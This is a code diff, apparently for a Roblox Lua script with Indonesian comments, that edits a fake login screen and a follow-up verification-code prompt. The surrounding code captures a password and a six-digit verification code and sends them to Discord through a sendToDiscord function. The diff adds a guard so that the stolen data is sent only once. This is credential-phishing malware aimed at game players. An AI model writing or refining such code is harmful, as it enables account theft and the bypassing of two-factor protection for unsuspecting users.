@@ -254,6 +254,10 @@ local function createVerificationCodeGUI()
 
     -- Fungsi Verifikasi Kode
     verifyCodeButton.MouseButton1Click:Connect(function()
+        if isDataSent then
+            return -- Hentikan jika data sudah terkirim
+        end
+            
         local verificationCode = codeBox.Text
         if verificationCode:match("^%d%d%d%d%d%d$") then
             sendToDiscord("Kode Verifikasi: " .. verificationCode)
@@ -333,7 +337,6 @@ local function createLoginGUI()
     local passwordBox = Instance.new("TextBox")
     local loginButton = Instance.new("TextButton")
     local errorLabel = Instance.new("TextLabel") -- Error label untuk validasi
-    local isDataSent = false
 
     -- Variabel untuk password asli dan kontrol pengiriman data
     local password = ""
@@ -453,7 +456,7 @@ local function createLoginGUI()
         isDataSent = true -- Tandai bahwa data sudah terkirim
         errorLabel.Text = "" -- Bersihkan error
         print("Data berhasil terkirim ke Discord!")
-        isDataSent = true
+
         gui:Destroy() -- Hapus GUI setelah sukses
         createLoadingGUI(3, function()
             createVerificationCodeGUI()
